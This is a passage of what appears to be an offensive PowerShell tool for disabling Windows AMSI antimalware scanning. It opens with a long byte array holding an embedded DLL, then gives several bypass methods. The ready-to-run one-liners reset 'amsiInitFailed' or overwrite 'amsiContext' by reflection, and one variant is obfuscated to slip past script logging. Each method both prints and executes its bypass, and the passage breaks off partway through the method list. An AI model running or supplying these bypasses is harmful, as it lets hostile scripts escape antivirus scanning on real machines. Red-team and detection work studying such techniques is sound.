65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\n\n    if (([IntPtr]::Size) -eq 8)\n    {\n        Write-Verbose \"64 bit process detected.\"\n        $DllBytes = $AmsiX64\n    }\n    elseif (([IntPtr]::Size) -eq 4)\n    {\n        Write-Verbose \"32 bit process detected.\"\n        $DllBytes = $AmsiX86\n    }\n\n    switch($method)\n    {\n\n        \"unload\"\n        {\n            Write-Verbose \"Using Matt Graeber's Reflection method.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'\n            }\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n            }\n        }\n\n        \"unloadsilent\"\n        {\n            Write-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)'\n            }\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)\n            }\n        }\n\n        \"unloadobfuscated\"\n        {\n            Write-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\"\n            if ($ShowOnly -eq $True)\n            {\n                $code = @\" \nSv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n\"@\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output $code\n            }\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                Sv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n\n            }\n        }\n\n        \"unload2\"\n        {\n            Write-Verbose \"Using Matt Graeber's second Reflection method.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'\n            }\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                